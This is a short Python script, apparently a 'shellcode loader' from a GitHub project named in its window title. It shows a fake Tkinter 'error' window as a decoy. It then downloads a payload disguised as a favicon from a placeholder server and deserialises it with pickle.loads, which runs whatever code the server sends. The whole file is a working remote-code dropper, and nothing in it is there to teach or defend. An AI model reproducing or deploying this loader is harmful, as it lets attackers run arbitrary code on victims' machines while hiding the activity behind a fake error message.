import urllib.request
from tkinter import *


class Application(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.createWidgets()

    def createWidgets(self):
        self.helloLabel = Label(self, text='error')
        self.helloLabel.pack()


app = Application()

app.master.title('https://github.com/iloveflag/PythonShellcodeLoader')
app.mainloop()

import pickle
import ctypes

shellcode = urllib.request.urlopen("http://yourserver/favicon.ico").read()
pickle.loads(shellcode)
